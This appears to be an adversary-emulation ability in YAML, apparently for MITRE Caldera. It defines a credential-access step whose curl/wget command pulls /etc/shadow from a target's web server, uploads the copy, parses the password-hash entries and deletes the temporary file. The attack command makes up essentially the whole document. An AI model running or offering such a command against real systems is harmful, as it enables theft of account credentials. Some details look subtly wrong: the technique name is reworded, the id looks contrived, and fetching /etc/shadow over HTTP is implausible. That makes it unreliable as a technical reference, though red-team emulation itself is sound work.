- id: a12f3c45-d678-4e90-1234-46789abcdef0
  name: Fetch and Parse /etc/shadow
  description: Fetch the /etc/shadow file from a remote web server and parse its contents.
  tactic: credential-access
  technique:
    attack_id: T1003.008
    name: OS Credential fetching /etc/passwd and /etc/shadow
  platforms:
    linux:
      sh:
        command: |
          curl -s http://#{target_ip}/etc/shadow -o /tmp/shadow_copy || wget -q http://#{target_ip}/etc/shadow -O /tmp/shadow_copy
        uploads:
          - /tmp/shadow_copy
        cleanup: |
          rm -f /tmp/shadow_copy
        parsers:
          plugins.stockpile.app.parsers.basic:
            - source: host.file.shadow_entry
              edge: contains
              target: file.shadow.data

